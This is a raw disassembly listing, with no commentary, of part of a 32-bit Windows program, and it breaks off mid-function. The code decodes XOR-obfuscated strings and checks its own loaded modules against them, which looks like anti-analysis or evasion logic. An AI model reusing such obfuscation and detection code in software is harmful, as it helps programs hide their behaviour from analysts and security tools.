  401694:	0f b6 48 06          	movzbl 0x6(%eax),%ecx
  401698:	88 54 24 09          	mov    %dl,0x9(%esp)
  40169c:	0f b6 50 07          	movzbl 0x7(%eax),%edx
  4016a0:	80 f1 4b             	xor    $0x4b,%cl
  4016a3:	80 f2 23             	xor    $0x23,%dl
  4016a6:	88 4c 24 0a          	mov    %cl,0xa(%esp)
  4016aa:	0f b6 48 08          	movzbl 0x8(%eax),%ecx
  4016ae:	88 54 24 0b          	mov    %dl,0xb(%esp)
  4016b2:	0f b6 50 09          	movzbl 0x9(%eax),%edx
  4016b6:	80 f1 bf             	xor    $0xbf,%cl
  4016b9:	80 f2 45             	xor    $0x45,%dl
  4016bc:	88 4c 24 0c          	mov    %cl,0xc(%esp)
  4016c0:	0f b6 48 0a          	movzbl 0xa(%eax),%ecx
  4016c4:	88 54 24 0d          	mov    %dl,0xd(%esp)
  4016c8:	0f b6 50 0b          	movzbl 0xb(%eax),%edx
  4016cc:	80 f1 3b             	xor    $0x3b,%cl
  4016cf:	80 f2 56             	xor    $0x56,%dl
  4016d2:	88 4c 24 0e          	mov    %cl,0xe(%esp)
  4016d6:	0f b6 48 0c          	movzbl 0xc(%eax),%ecx
  4016da:	88 54 24 0f          	mov    %dl,0xf(%esp)
  4016de:	0f b6 50 0d          	movzbl 0xd(%eax),%edx
  4016e2:	80 f1 f8             	xor    $0xf8,%cl
  4016e5:	80 f2 98             	xor    $0x98,%dl
  4016e8:	88 4c 24 10          	mov    %cl,0x10(%esp)
  4016ec:	0f b6 48 0e          	movzbl 0xe(%eax),%ecx
  4016f0:	88 54 24 11          	mov    %dl,0x11(%esp)
  4016f4:	0f b6 50 0f          	movzbl 0xf(%eax),%edx
  4016f8:	80 f1 5b             	xor    $0x5b,%cl
  4016fb:	80 f2 f4             	xor    $0xf4,%dl
  4016fe:	88 4c 24 12          	mov    %cl,0x12(%esp)
  401702:	0f b6 48 10          	movzbl 0x10(%eax),%ecx
  401706:	88 54 24 13          	mov    %dl,0x13(%esp)
  40170a:	0f b6 50 11          	movzbl 0x11(%eax),%edx
  40170e:	80 f1 b5             	xor    $0xb5,%cl
  401711:	80 f2 87             	xor    $0x87,%dl
  401714:	88 4c 24 14          	mov    %cl,0x14(%esp)
  401718:	0f b6 48 12          	movzbl 0x12(%eax),%ecx
  40171c:	88 54 24 15          	mov    %dl,0x15(%esp)
  401720:	0f b6 50 13          	movzbl 0x13(%eax),%edx
  401724:	80 f1 7b             	xor    $0x7b,%cl
  401727:	80 f2 0f             	xor    $0xf,%dl
  40172a:	88 4c 24 16          	mov    %cl,0x16(%esp)
  40172e:	0f b6 48 14          	movzbl 0x14(%eax),%ecx
  401732:	88 54 24 17          	mov    %dl,0x17(%esp)
  401736:	0f b6 50 15          	movzbl 0x15(%eax),%edx
  40173a:	80 f1 f4             	xor    $0xf4,%cl
  40173d:	80 f2 76             	xor    $0x76,%dl
  401740:	88 4c 24 18          	mov    %cl,0x18(%esp)
  401744:	0f b6 48 16          	movzbl 0x16(%eax),%ecx
  401748:	88 54 24 19          	mov    %dl,0x19(%esp)
  40174c:	0f b6 50 17          	movzbl 0x17(%eax),%edx
  401750:	80 f1 b9             	xor    $0xb9,%cl
  401753:	80 f2 34             	xor    $0x34,%dl
  401756:	88 4c 24 1a          	mov    %cl,0x1a(%esp)
  40175a:	0f b6 48 18          	movzbl 0x18(%eax),%ecx
  40175e:	88 54 24 1b          	mov    %dl,0x1b(%esp)
  401762:	0f b6 50 19          	movzbl 0x19(%eax),%edx
  401766:	80 f1 bf             	xor    $0xbf,%cl
  401769:	80 f2 1e             	xor    $0x1e,%dl
  40176c:	88 4c 24 1c          	mov    %cl,0x1c(%esp)
  401770:	0f b6 48 1a          	movzbl 0x1a(%eax),%ecx
  401774:	88 54 24 1d          	mov    %dl,0x1d(%esp)
  401778:	0f b6 50 1b          	movzbl 0x1b(%eax),%edx
  40177c:	8b 74 24 30          	mov    0x30(%esp),%esi
  401780:	80 f1 e7             	xor    $0xe7,%cl
  401783:	80 f2 78             	xor    $0x78,%dl
  401786:	88 4c 24 1e          	mov    %cl,0x1e(%esp)
  40178a:	0f b6 48 1c          	movzbl 0x1c(%eax),%ecx
  40178e:	88 54 24 1f          	mov    %dl,0x1f(%esp)
  401792:	0f b6 50 1d          	movzbl 0x1d(%eax),%edx
  401796:	80 f1 98             	xor    $0x98,%cl
  401799:	80 f2 e9             	xor    $0xe9,%dl
  40179c:	88 4c 24 20          	mov    %cl,0x20(%esp)
  4017a0:	0f b6 48 1e          	movzbl 0x1e(%eax),%ecx
  4017a4:	88 54 24 21          	mov    %dl,0x21(%esp)
  4017a8:	0f b6 50 1f          	movzbl 0x1f(%eax),%edx
  4017ac:	6a 20                	push   $0x20
  4017ae:	8d 44 24 08          	lea    0x8(%esp),%eax
  4017b2:	50                   	push   %eax
  4017b3:	80 f1 6f             	xor    $0x6f,%cl
  4017b6:	80 f2 b4             	xor    $0xb4,%dl
  4017b9:	56                   	push   %esi
  4017ba:	88 4c 24 2e          	mov    %cl,0x2e(%esp)
  4017be:	88 54 24 2f          	mov    %dl,0x2f(%esp)
  4017c2:	c6 44 24 30 00       	movb   $0x0,0x30(%esp)
  4017c7:	e8 84 9b 00 00       	call   0x40b350
  4017cc:	83 c4 0c             	add    $0xc,%esp
  4017cf:	8b c6                	mov    %esi,%eax
  4017d1:	5e                   	pop    %esi
  4017d2:	83 c4 24             	add    $0x24,%esp
  4017d5:	c3                   	ret
  4017d6:	cc                   	int3
  4017d7:	cc                   	int3
  4017d8:	cc                   	int3
  4017d9:	cc                   	int3
  4017da:	cc                   	int3
  4017db:	cc                   	int3
  4017dc:	cc                   	int3
  4017dd:	cc                   	int3
  4017de:	cc                   	int3
  4017df:	cc                   	int3
  4017e0:	56                   	push   %esi
  4017e1:	8b 74 24 08          	mov    0x8(%esp),%esi
  4017e5:	85 f6                	test   %esi,%esi
  4017e7:	75 0a                	jne    0x4017f3
  4017e9:	68 57 00 07 80       	push   $0x80070057
  4017ee:	e8 0d f8 ff ff       	call   0x401000
  4017f3:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4017f7:	85 c9                	test   %ecx,%ecx
  4017f9:	7d 0a                	jge    0x401805
  4017fb:	68 57 00 07 80       	push   $0x80070057
  401800:	e8 fb f7 ff ff       	call   0x401000
  401805:	57                   	push   %edi
  401806:	8b 7c 24 14          	mov    0x14(%esp),%edi
  40180a:	85 ff                	test   %edi,%edi
  40180c:	75 0a                	jne    0x401818
  40180e:	68 57 00 07 80       	push   $0x80070057
  401813:	e8 e8 f7 ff ff       	call   0x401000
  401818:	8b 06                	mov    (%esi),%eax
  40181a:	3b c7                	cmp    %edi,%eax
  40181c:	74 3a                	je     0x401858
  40181e:	3b 4c 24 18          	cmp    0x18(%esp),%ecx
  401822:	7e 1a                	jle    0x40183e
  401824:	6a 02                	push   $0x2
  401826:	51                   	push   %ecx
  401827:	50                   	push   %eax
  401828:	e8 56 9f 00 00       	call   0x40b783
  40182d:	83 c4 0c             	add    $0xc,%esp
  401830:	85 c0                	test   %eax,%eax
  401832:	75 35                	jne    0x401869
  401834:	68 0e 00 07 80       	push   $0x8007000e
  401839:	e8 c2 f7 ff ff       	call   0x401000
  40183e:	50                   	push   %eax
  40183f:	e8 71 9e 00 00       	call   0x40b6b5
  401844:	83 c4 04             	add    $0x4,%esp
  401847:	89 3e                	mov    %edi,(%esi)
  401849:	83 3e 00             	cmpl   $0x0,(%esi)
  40184c:	75 1f                	jne    0x40186d
  40184e:	68 0e 00 07 80       	push   $0x8007000e
  401853:	e8 a8 f7 ff ff       	call   0x401000
  401858:	3b 4c 24 18          	cmp    0x18(%esp),%ecx
  40185c:	7e e9                	jle    0x401847
  40185e:	6a 02                	push   $0x2
  401860:	51                   	push   %ecx
  401861:	e8 dd 9e 00 00       	call   0x40b743
  401866:	83 c4 08             	add    $0x8,%esp
  401869:	89 06                	mov    %eax,(%esi)
  40186b:	eb dc                	jmp    0x401849
  40186d:	5f                   	pop    %edi
  40186e:	5e                   	pop    %esi
  40186f:	c3                   	ret
  401870:	53                   	push   %ebx
  401871:	56                   	push   %esi
  401872:	57                   	push   %edi
  401873:	6a 0c                	push   $0xc
  401875:	8b d9                	mov    %ecx,%ebx
  401877:	e8 ea 96 00 00       	call   0x40af66
  40187c:	8b f0                	mov    %eax,%esi
  40187e:	83 c4 04             	add    $0x4,%esp
  401881:	85 f6                	test   %esi,%esi
  401883:	74 2d                	je     0x4018b2
  401885:	8b 7c 24 10          	mov    0x10(%esp),%edi
  401889:	57                   	push   %edi
  40188a:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  401891:	c7 46 08 01 00 00 00 	movl   $0x1,0x8(%esi)
  401898:	ff 15 74 b1 41 00    	call   *0x41b174
  40189e:	89 06                	mov    %eax,(%esi)
  4018a0:	85 c0                	test   %eax,%eax
  4018a2:	75 10                	jne    0x4018b4
  4018a4:	85 ff                	test   %edi,%edi
  4018a6:	74 0c                	je     0x4018b4
  4018a8:	68 0e 00 07 80       	push   $0x8007000e
  4018ad:	e8 de 94 00 00       	call   0x40ad90
  4018b2:	33 f6                	xor    %esi,%esi
  4018b4:	89 33                	mov    %esi,(%ebx)
  4018b6:	85 f6                	test   %esi,%esi
  4018b8:	75 0a                	jne    0x4018c4
  4018ba:	68 0e 00 07 80       	push   $0x8007000e
  4018bf:	e8 cc 94 00 00       	call   0x40ad90
  4018c4:	5f                   	pop    %edi
  4018c5:	5e                   	pop    %esi
  4018c6:	8b c3                	mov    %ebx,%eax
  4018c8:	5b                   	pop    %ebx
  4018c9:	c2 04 00             	ret    $0x4
  4018cc:	cc                   	int3
  4018cd:	cc                   	int3
  4018ce:	cc                   	int3
  4018cf:	cc                   	int3
  4018d0:	56                   	push   %esi
  4018d1:	8b f1                	mov    %ecx,%esi
  4018d3:	8b 06                	mov    (%esi),%eax
  4018d5:	85 c0                	test   %eax,%eax
  4018d7:	74 08                	je     0x4018e1
  4018d9:	8b 08                	mov    (%eax),%ecx
  4018db:	8b 51 08             	mov    0x8(%ecx),%edx
  4018de:	50                   	push   %eax
  4018df:	ff d2                	call   *%edx
  4018e1:	8b c6                	mov    %esi,%eax
  4018e3:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  4018e9:	5e                   	pop    %esi
  4018ea:	c3                   	ret
  4018eb:	cc                   	int3
  4018ec:	cc                   	int3
  4018ed:	cc                   	int3
  4018ee:	cc                   	int3
  4018ef:	cc                   	int3
  4018f0:	53                   	push   %ebx
  4018f1:	55                   	push   %ebp
  4018f2:	8b 6c 24 0c          	mov    0xc(%esp),%ebp
  4018f6:	8b d9                	mov    %ecx,%ebx
  4018f8:	85 ed                	test   %ebp,%ebp
  4018fa:	75 07                	jne    0x401903
  4018fc:	89 2b                	mov    %ebp,(%ebx)
  4018fe:	5d                   	pop    %ebp
  4018ff:	5b                   	pop    %ebx
  401900:	c2 08 00             	ret    $0x8
  401903:	56                   	push   %esi
  401904:	57                   	push   %edi
  401905:	55                   	push   %ebp
  401906:	ff 15 0c b0 41 00    	call   *0x41b00c
  40190c:	8b f8                	mov    %eax,%edi
  40190e:	68 80 00 00 00       	push   $0x80
  401913:	8d 43 04             	lea    0x4(%ebx),%eax
  401916:	50                   	push   %eax
  401917:	47                   	inc    %edi
  401918:	57                   	push   %edi
  401919:	53                   	push   %ebx
  40191a:	e8 c1 fe ff ff       	call   0x4017e0
  40191f:	8b 03                	mov    (%ebx),%eax
  401921:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  401925:	83 c4 10             	add    $0x10,%esp
  401928:	57                   	push   %edi
  401929:	50                   	push   %eax
  40192a:	57                   	push   %edi
  40192b:	55                   	push   %ebp
  40192c:	6a 00                	push   $0x0
  40192e:	51                   	push   %ecx
  40192f:	ff 15 08 b0 41 00    	call   *0x41b008
  401935:	8b f0                	mov    %eax,%esi
  401937:	f7 de                	neg    %esi
  401939:	1b f6                	sbb    %esi,%esi
  40193b:	83 c6 01             	add    $0x1,%esi
  40193e:	74 56                	je     0x401996
  401940:	ff 15 04 b0 41 00    	call   *0x41b004
  401946:	83 f8 7a             	cmp    $0x7a,%eax
  401949:	75 42                	jne    0x40198d
  40194b:	8b 54 24 18          	mov    0x18(%esp),%edx
  40194f:	6a 00                	push   $0x0
  401951:	6a 00                	push   $0x0
  401953:	57                   	push   %edi
  401954:	55                   	push   %ebp
  401955:	6a 00                	push   $0x0
  401957:	52                   	push   %edx
  401958:	ff 15 08 b0 41 00    	call   *0x41b008
  40195e:	8b f0                	mov    %eax,%esi
  401960:	68 80 00 00 00       	push   $0x80
  401965:	8d 43 04             	lea    0x4(%ebx),%eax
  401968:	50                   	push   %eax
  401969:	56                   	push   %esi
  40196a:	53                   	push   %ebx
  40196b:	e8 70 fe ff ff       	call   0x4017e0
  401970:	8b 03                	mov    (%ebx),%eax
  401972:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  401976:	83 c4 10             	add    $0x10,%esp
  401979:	56                   	push   %esi
  40197a:	50                   	push   %eax
  40197b:	57                   	push   %edi
  40197c:	55                   	push   %ebp
  40197d:	6a 00                	push   $0x0
  40197f:	51                   	push   %ecx
  401980:	ff 15 08 b0 41 00    	call   *0x41b008
  401986:	8b f0                	mov    %eax,%esi
  401988:	f7 de                	neg    %esi
  40198a:	1b f6                	sbb    %esi,%esi
  40198c:	46                   	inc    %esi
  40198d:	85 f6                	test   %esi,%esi
  40198f:	74 05                	je     0x401996
  401991:	e8 9a f6 ff ff       	call   0x401030
  401996:	5f                   	pop    %edi
  401997:	5e                   	pop    %esi
  401998:	5d                   	pop    %ebp
  401999:	5b                   	pop    %ebx
  40199a:	c2 08 00             	ret    $0x8
  40199d:	cc                   	int3
  40199e:	cc                   	int3
  40199f:	cc                   	int3
  4019a0:	56                   	push   %esi
  4019a1:	57                   	push   %edi
  4019a2:	8b f9                	mov    %ecx,%edi
  4019a4:	8b 37                	mov    (%edi),%esi
  4019a6:	85 f6                	test   %esi,%esi
  4019a8:	74 3e                	je     0x4019e8
  4019aa:	8d 46 08             	lea    0x8(%esi),%eax
  4019ad:	50                   	push   %eax
  4019ae:	ff 15 10 b0 41 00    	call   *0x41b010
  4019b4:	85 c0                	test   %eax,%eax
  4019b6:	75 2a                	jne    0x4019e2
  4019b8:	85 f6                	test   %esi,%esi
  4019ba:	74 26                	je     0x4019e2
  4019bc:	8b 06                	mov    (%esi),%eax
  4019be:	85 c0                	test   %eax,%eax
  4019c0:	74 07                	je     0x4019c9
  4019c2:	50                   	push   %eax
  4019c3:	ff 15 70 b1 41 00    	call   *0x41b170
  4019c9:	8b 46 04             	mov    0x4(%esi),%eax
  4019cc:	85 c0                	test   %eax,%eax
  4019ce:	74 09                	je     0x4019d9
  4019d0:	50                   	push   %eax
  4019d1:	e8 f5 95 00 00       	call   0x40afcb
  4019d6:	83 c4 04             	add    $0x4,%esp
  4019d9:	56                   	push   %esi
  4019da:	e8 e1 94 00 00       	call   0x40aec0
  4019df:	83 c4 04             	add    $0x4,%esp
  4019e2:	c7 07 00 00 00 00    	movl   $0x0,(%edi)
  4019e8:	5f                   	pop    %edi
  4019e9:	5e                   	pop    %esi
  4019ea:	c3                   	ret
  4019eb:	cc                   	int3
  4019ec:	cc                   	int3
  4019ed:	cc                   	int3
  4019ee:	cc                   	int3
  4019ef:	cc                   	int3
  4019f0:	81 ec 8c 04 00 00    	sub    $0x48c,%esp
  4019f6:	53                   	push   %ebx
  4019f7:	55                   	push   %ebp
  4019f8:	56                   	push   %esi
  4019f9:	57                   	push   %edi
  4019fa:	33 db                	xor    %ebx,%ebx
  4019fc:	53                   	push   %ebx
  4019fd:	ff 15 7c b1 41 00    	call   *0x41b17c
  401a03:	8d 84 24 14 01 00 00 	lea    0x114(%esp),%eax
  401a0a:	50                   	push   %eax
  401a0b:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  401a0f:	51                   	push   %ecx
  401a10:	c6 44 24 18 e0       	movb   $0xe0,0x18(%esp)
  401a15:	c6 44 24 19 3b       	movb   $0x3b,0x19(%esp)
  401a1a:	c6 44 24 1a 8d       	movb   $0x8d,0x1a(%esp)
  401a1f:	c6 44 24 1b 2a       	movb   $0x2a,0x1b(%esp)
  401a24:	c6 44 24 1c a2       	movb   $0xa2,0x1c(%esp)
  401a29:	c6 44 24 1d 2a       	movb   $0x2a,0x1d(%esp)
  401a2e:	c6 44 24 1e 2a       	movb   $0x2a,0x1e(%esp)
  401a33:	c6 44 24 1f 41       	movb   $0x41,0x1f(%esp)
  401a38:	c6 44 24 20 d3       	movb   $0xd3,0x20(%esp)
  401a3d:	c6 44 24 21 20       	movb   $0x20,0x21(%esp)
  401a42:	c6 44 24 22 64       	movb   $0x64,0x22(%esp)
  401a47:	c6 44 24 23 06       	movb   $0x6,0x23(%esp)
  401a4c:	c6 44 24 24 8a       	movb   $0x8a,0x24(%esp)
  401a51:	c6 44 24 25 f7       	movb   $0xf7,0x25(%esp)
  401a56:	c6 44 24 26 3d       	movb   $0x3d,0x26(%esp)
  401a5b:	c6 44 24 27 9d       	movb   $0x9d,0x27(%esp)
  401a60:	c6 44 24 28 d9       	movb   $0xd9,0x28(%esp)
  401a65:	c6 44 24 29 ee       	movb   $0xee,0x29(%esp)
  401a6a:	c6 44 24 2a 15       	movb   $0x15,0x2a(%esp)
  401a6f:	c6 44 24 2b 68       	movb   $0x68,0x2b(%esp)
  401a74:	c6 44 24 2c f4       	movb   $0xf4,0x2c(%esp)
  401a79:	c6 44 24 2d 76       	movb   $0x76,0x2d(%esp)
  401a7e:	c6 44 24 2e b9       	movb   $0xb9,0x2e(%esp)
  401a83:	c6 44 24 2f 34       	movb   $0x34,0x2f(%esp)
  401a88:	c6 44 24 30 bf       	movb   $0xbf,0x30(%esp)
  401a8d:	c6 44 24 31 1e       	movb   $0x1e,0x31(%esp)
  401a92:	c6 44 24 32 e7       	movb   $0xe7,0x32(%esp)
  401a97:	c6 44 24 33 78       	movb   $0x78,0x33(%esp)
  401a9c:	c6 44 24 34 98       	movb   $0x98,0x34(%esp)
  401aa1:	c6 44 24 35 e9       	movb   $0xe9,0x35(%esp)
  401aa6:	c6 44 24 36 6f       	movb   $0x6f,0x36(%esp)
  401aab:	c6 44 24 37 b4       	movb   $0xb4,0x37(%esp)
  401ab0:	88 5c 24 38          	mov    %bl,0x38(%esp)
  401ab4:	e8 97 fb ff ff       	call   0x401650
  401ab9:	50                   	push   %eax
  401aba:	e8 df 9e 00 00       	call   0x40b99e
  401abf:	83 c4 0c             	add    $0xc,%esp
  401ac2:	3d a0 b2 41 00       	cmp    $0x41b2a0,%eax
  401ac7:	0f 84 bd 09 00 00    	je     0x40248a
  401acd:	ff 15 44 b0 41 00    	call   *0x41b044
  401ad3:	50                   	push   %eax
  401ad4:	6a 08                	push   $0x8
  401ad6:	e8 ad 92 00 00       	call   0x40ad88
  401adb:	8d 94 24 78 02 00 00 	lea    0x278(%esp),%edx
  401ae2:	8b f8                	mov    %eax,%edi
  401ae4:	52                   	push   %edx
  401ae5:	57                   	push   %edi
  401ae6:	c7 84 24 80 02 00 00 	movl   $0x224,0x280(%esp)
  401aed:	24 02 00 00 
  401af1:	c6 44 24 64 ce       	movb   $0xce,0x64(%esp)
  401af6:	c6 44 24 65 27       	movb   $0x27,0x65(%esp)
  401afb:	c6 44 24 66 9c       	movb   $0x9c,0x66(%esp)
  401b00:	c6 44 24 67 1a       	movb   $0x1a,0x67(%esp)
  401b05:	c6 44 24 68 95       	movb   $0x95,0x68(%esp)
  401b0a:	c6 44 24 69 2e       	movb   $0x2e,0x69(%esp)
  401b0f:	c6 44 24 6a 22       	movb   $0x22,0x6a(%esp)
  401b14:	c6 44 24 6b 57       	movb   $0x57,0x6b(%esp)
  401b19:	c6 44 24 6c 91       	movb   $0x91,0x6c(%esp)
  401b1e:	c6 44 24 6d 21       	movb   $0x21,0x6d(%esp)
  401b23:	c6 44 24 6e 57       	movb   $0x57,0x6e(%esp)
  401b28:	c6 44 24 6f 3a       	movb   $0x3a,0x6f(%esp)
  401b2d:	c6 44 24 70 f8       	movb   $0xf8,0x70(%esp)
  401b32:	c6 44 24 71 98       	movb   $0x98,0x71(%esp)
  401b37:	c6 44 24 72 5b       	movb   $0x5b,0x72(%esp)
  401b3c:	c6 44 24 73 f4       	movb   $0xf4,0x73(%esp)
  401b41:	c6 44 24 74 b5       	movb   $0xb5,0x74(%esp)
  401b46:	c6 44 24 75 87       	movb   $0x87,0x75(%esp)
  401b4b:	c6 44 24 76 7b       	movb   $0x7b,0x76(%esp)
  401b50:	c6 44 24 77 0f       	movb   $0xf,0x77(%esp)
  401b55:	c6 44 24 78 f4       	movb   $0xf4,0x78(%esp)
  401b5a:	c6 44 24 79 76       	movb   $0x76,0x79(%esp)
  401b5f:	c6 44 24 7a b9       	movb   $0xb9,0x7a(%esp)
  401b64:	c6 44 24 7b 34       	movb   $0x34,0x7b(%esp)
  401b69:	c6 44 24 7c bf       	movb   $0xbf,0x7c(%esp)
  401b6e:	c6 44 24 7d 1e       	movb   $0x1e,0x7d(%esp)
  401b73:	c6 44 24 7e e7       	movb   $0xe7,0x7e(%esp)
  401b78:	c6 44 24 7f 78       	movb   $0x78,0x7f(%esp)
  401b7d:	c6 84 24 80 00 00 00 	movb   $0x98,0x80(%esp)
  401b84:	98 
  401b85:	c6 84 24 81 00 00 00 	movb   $0xe9,0x81(%esp)
  401b8c:	e9 
  401b8d:	c6 84 24 82 00 00 00 	movb   $0x6f,0x82(%esp)
  401b94:	6f 
  401b95:	c6 84 24 83 00 00 00 	movb   $0xb4,0x83(%esp)
  401b9c:	b4 
  401b9d:	88 9c 24 84 00 00 00 	mov    %bl,0x84(%esp)
  401ba4:	c6 44 24 18 c0       	movb   $0xc0,0x18(%esp)
  401ba9:	c6 44 24 19 38       	movb   $0x38,0x19(%esp)
  401bae:	c6 44 24 1a 8d       	movb   $0x8d,0x1a(%esp)
  401bb3:	c6 44 24 1b 1f       	movb   $0x1f,0x1b(%esp)
  401bb8:	c6 44 24 1c 8e       	movb   $0x8e,0x1c(%esp)
  401bbd:	c6 44 24 1d 30       	movb   $0x30,0x1d(%esp)
  401bc2:	c6 44 24 1e 65       	movb   $0x65,0x1e(%esp)
  401bc7:	c6 44 24 1f 47       	movb   $0x47,0x1f(%esp)
  401bcc:	c6 44 24 20 d3       	movb   $0xd3,0x20(%esp)
  401bd1:	c6 44 24 21 29       	movb   $0x29,0x21(%esp)
  401bd6:	c6 44 24 22 3b       	movb   $0x3b,0x22(%esp)
  401bdb:	c6 44 24 23 56       	movb   $0x56,0x23(%esp)
  401be0:	c6 44 24 24 f8       	movb   $0xf8,0x24(%esp)
  401be5:	c6 44 24 25 98       	movb   $0x98,0x25(%esp)
  401bea:	c6 44 24 26 5b       	movb   $0x5b,0x26(%esp)
  401bef:	c6 44 24 27 f4       	movb   $0xf4,0x27(%esp)
  401bf4:	c6 44 24 28 b5       	movb   $0xb5,0x28(%esp)
  401bf9:	c6 44 24 29 87       	movb   $0x87,0x29(%esp)
  401bfe:	c6 44 24 2a 7b       	movb   $0x7b,0x2a(%esp)
  401c03:	c6 44 24 2b 0f       	movb   $0xf,0x2b(%esp)
  401c08:	c6 44 24 2c f4       	movb   $0xf4,0x2c(%esp)
  401c0d:	c6 44 24 2d 76       	movb   $0x76,0x2d(%esp)
  401c12:	c6 44 24 2e b9       	movb   $0xb9,0x2e(%esp)
  401c17:	c6 44 24 2f 34       	movb   $0x34,0x2f(%esp)
  401c1c:	c6 44 24 30 bf       	movb   $0xbf,0x30(%esp)
  401c21:	c6 44 24 31 1e       	movb   $0x1e,0x31(%esp)
  401c26:	c6 44 24 32 e7       	movb   $0xe7,0x32(%esp)
  401c2b:	c6 44 24 33 78       	movb   $0x78,0x33(%esp)
  401c30:	c6 44 24 34 98       	movb   $0x98,0x34(%esp)
  401c35:	c6 44 24 35 e9       	movb   $0xe9,0x35(%esp)
  401c3a:	c6 44 24 36 6f       	movb   $0x6f,0x36(%esp)
  401c3f:	c6 44 24 37 b4       	movb   $0xb4,0x37(%esp)
  401c44:	88 5c 24 38          	mov    %bl,0x38(%esp)
  401c48:	e8 35 91 00 00       	call   0x40ad82
  401c4d:	85 c0                	test   %eax,%eax
  401c4f:	0f 84 6e 01 00 00    	je     0x401dc3
  401c55:	8d 84 24 d4 00 00 00 	lea    0xd4(%esp),%eax
  401c5c:	50                   	push   %eax
  401c5d:	8d 4c 24 60          	lea    0x60(%esp),%ecx
  401c61:	51                   	push   %ecx
  401c62:	e8 e9 f9 ff ff       	call   0x401650
  401c67:	83 c4 08             	add    $0x8,%esp
  401c6a:	8b f0                	mov    %eax,%esi
  401c6c:	8d 94 24 98 02 00 00 	lea    0x298(%esp),%edx
  401c73:	8a 02                	mov    (%edx),%al
  401c75:	3a 06                	cmp    (%esi),%al
  401c77:	75 1a                	jne    0x401c93
  401c79:	3a c3                	cmp    %bl,%al
  401c7b:	74 12                	je     0x401c8f
  401c7d:	8a 4a 01             	mov    0x1(%edx),%cl
  401c80:	3a 4e 01             	cmp    0x1(%esi),%cl
  401c83:	75 0e                	jne    0x401c93
  401c85:	83 c2 02             	add    $0x2,%edx
  401c88:	83 c6 02             	add    $0x2,%esi
  401c8b:	3a cb                	cmp    %bl,%cl
  401c8d:	75 e4                	jne    0x401c73
  401c8f:	33 c0                	xor    %eax,%eax
  401c91:	eb 05                	jmp    0x401c98
  401c93:	1b c0                	sbb    %eax,%eax
  401c95:	83 d8 ff             	sbb    $0xffffffff,%eax
  401c98:	3b c3                	cmp    %ebx,%eax
  401c9a:	75 14                	jne    0x401cb0
  401c9c:	57                   	push   %edi
  401c9d:	ff 15 38 b0 41 00    	call   *0x41b038
  401ca3:	33 c0                	xor    %eax,%eax
  401ca5:	5f                   	pop    %edi
  401ca6:	5e                   	pop    %esi
  401ca7:	5d                   	pop    %ebp
  401ca8:	5b                   	pop    %ebx
  401ca9:	81 c4 8c 04 00 00    	add    $0x48c,%esp
  401caf:	c3                   	ret
  401cb0:	8d 94 24 b4 00 00 00 	lea    0xb4(%esp),%edx
  401cb7:	52                   	push   %edx
  401cb8:	8d 44 24 14          	lea    0x14(%esp),%eax
  401cbc:	50                   	push   %eax
  401cbd:	e8 8e f9 ff ff       	call   0x401650
  401cc2:	83 c4 08             	add    $0x8,%esp
  401cc5:	8b f0                	mov    %eax,%esi
  401cc7:	8d 8c 24 98 02 00 00 	lea    0x298(%esp),%ecx
  401cce:	8b ff                	mov    %edi,%edi
  401cd0:	8a 01                	mov    (%ecx),%al
  401cd2:	3a 06                	cmp    (%esi),%al
  401cd4:	75 1a                	jne    0x401cf0
  401cd6:	3a c3                	cmp    %bl,%al
  401cd8:	74 12                	je     0x401cec
  401cda:	8a 41 01             	mov    0x1(%ecx),%al
  401cdd:	3a 46 01             	cmp    0x1(%esi),%al
  401ce0:	75 0e                	jne    0x401cf0
  401ce2:	83 c1 02             	add    $0x2,%ecx
  401ce5:	83 c6 02             	add    $0x2,%esi
  401ce8:	3a c3                	cmp    %bl,%al
  401cea:	75 e4                	jne    0x401cd0
  401cec:	33 c0                	xor    %eax,%eax
  401cee:	eb 05                	jmp    0x401cf5
  401cf0:	1b c0                	sbb    %eax,%eax
  401cf2:	83 d8 ff             	sbb    $0xffffffff,%eax
  401cf5:	3b c3                	cmp    %ebx,%eax
  401cf7:	74 a3                	je     0x401c9c
  401cf9:	8d 8c 24 78 02 00 00 	lea    0x278(%esp),%ecx
  401d00:	51                   	push   %ecx
  401d01:	57                   	push   %edi
  401d02:	e8 75 90 00 00       	call   0x40ad7c
  401d07:	85 c0                	test   %eax,%eax
  401d09:	0f 84 b4 00 00 00    	je     0x401dc3
  401d0f:	90                   	nop
  401d10:	8d 94 24 d4 00 00 00 	lea    0xd4(%esp),%edx
  401d17:	52                   	push   %edx
  401d18:	8d 44 24 60          	lea    0x60(%esp),%eax
  401d1c:	50                   	push   %eax
  401d1d:	e8 2e f9 ff ff       	call   0x401650
  401d22:	83 c4 08             	add    $0x8,%esp
  401d25:	8b f0                	mov    %eax,%esi
  401d27:	8d 8c 24 98 02 00 00 	lea    0x298(%esp),%ecx
  401d2e:	8b ff                	mov    %edi,%edi
  401d30:	8a 01                	mov    (%ecx),%al
  401d32:	3a 06                	cmp    (%esi),%al
  401d34:	75 1a                	jne    0x401d50
  401d36:	3a c3                	cmp    %bl,%al
  401d38:	74 12                	je     0x401d4c
  401d3a:	8a 41 01             	mov    0x1(%ecx),%al
  401d3d:	3a 46 01             	cmp    0x1(%esi),%al
  401d40:	75 0e                	jne    0x401d50
  401d42:	83 c1 02             	add    $0x2,%ecx
  401d45:	83 c6 02             	add    $0x2,%esi
  401d48:	3a c3                	cmp    %bl,%al
  401d4a:	75 e4                	jne    0x401d30
  401d4c:	33 c0                	xor    %eax,%eax
  401d4e:	eb 05                	jmp    0x401d55
  401d50:	1b c0                	sbb    %eax,%eax
  401d52:	83 d8 ff             	sbb    $0xffffffff,%eax
  401d55:	3b c3                	cmp    %ebx,%eax
  401d57:	0f 84 3f ff ff ff    	je     0x401c9c
  401d5d:	8d 8c 24 b4 00 00 00 	lea    0xb4(%esp),%ecx
  401d64:	51                   	push   %ecx
  401d65:	8d 54 24 14          	lea    0x14(%esp),%edx
  401d69:	52                   	push   %edx
  401d6a:	e8 e1 f8 ff ff       	call   0x401650
  401d6f:	83 c4 08             	add    $0x8,%esp
  401d72:	8b f0                	mov    %eax,%esi
  401d74:	8d 8c 24 98 02 00 00 	lea    0x298(%esp),%ecx
  401d7b:	eb 03                	jmp    0x401d80
  401d7d:	8d 49 00             	lea    0x0(%ecx),%ecx
  401d80:	8a 01                	mov    (%ecx),%al
